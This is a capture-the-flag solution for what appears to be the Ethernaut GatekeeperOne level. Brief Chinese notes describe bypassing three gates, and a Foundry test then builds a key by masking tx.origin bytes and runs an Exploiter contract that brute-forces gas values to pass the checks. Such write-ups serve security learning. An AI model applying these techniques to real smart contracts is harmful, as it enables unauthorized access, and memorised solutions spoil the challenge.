- gateOne：使用合约间接调用
- gateTwo：枚举 gas
- gateThree：将 tx.origin 的低 3、4 bytes 挖空作为 gateKey 即可

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/GatekeeperOne.sol";
import "src/levels/GatekeeperOneFactory.sol";
import "forge-std/console.sol";

contract TestGatekeeperOne is BaseTest {
    GatekeeperOne private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new GatekeeperOneFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = GatekeeperOne(levelAddress);

        assertEq(level.entrant(), address(0));
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        bytes8 key = bytes8(uint64(uint160(player))) & 0xFFFFFFFF0000FFFF;

        Exploiter exploiter = new Exploiter(level);
        exploiter.exploit(key);

        vm.stopPrank();
    }
}

contract Exploiter is Test {
    GatekeeperOne private level;
    address private owner;

    constructor(GatekeeperOne _level) public {
        level = _level;
        owner = msg.sender;
    }

    function exploit(bytes8 gateKey) external {
        for (uint256 i = 0; i <= 8191; i++) {
            try level.enter{gas: 100000 + i}(gateKey) {
                console.log("success gas:", 100000 + i);
                break;
            } catch {}
        }
    }
}
```

